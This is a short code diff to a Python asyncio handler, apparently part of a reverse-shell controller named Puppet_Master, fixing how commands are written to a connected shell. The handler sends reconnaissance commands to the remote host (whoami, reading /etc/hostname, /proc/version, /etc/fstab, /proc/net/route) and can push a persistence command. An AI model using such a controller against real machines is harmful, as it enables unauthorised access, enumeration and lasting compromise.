@@ -78,12 +78,14 @@ async def handle_shell_init(reader, writer):
     init_command += f"echo {randomStringWhoamiPrefix} && whoami && echo {randomStringWhoamiSuffix}\n"
     init_command += f"echo {randomStringHostnamePrefix} && cat /etc/hostname && echo {randomStringHostnameSuffix}\n"
     init_command += f"echo {randomStringPrefix} && whoami && cat /proc/version /etc/fstab /proc/net/route && echo {randomStringSuffix}\n"
-    await writer.write( init_command.encode() ).drain()
+    writer.write( init_command.encode() )
+    await writer.drain()
 
     if Puppet_Master.Persistence:
         writer.write( Puppet_Master.PersistenceCommand.encode() + "\n".encode() )
 
-    await writer.write( "echo Puppet\n".encode() ).drain()
+    writer.write( "echo Puppet\n".encode() )
+    await writer.drain()
 
     while True:
         try:
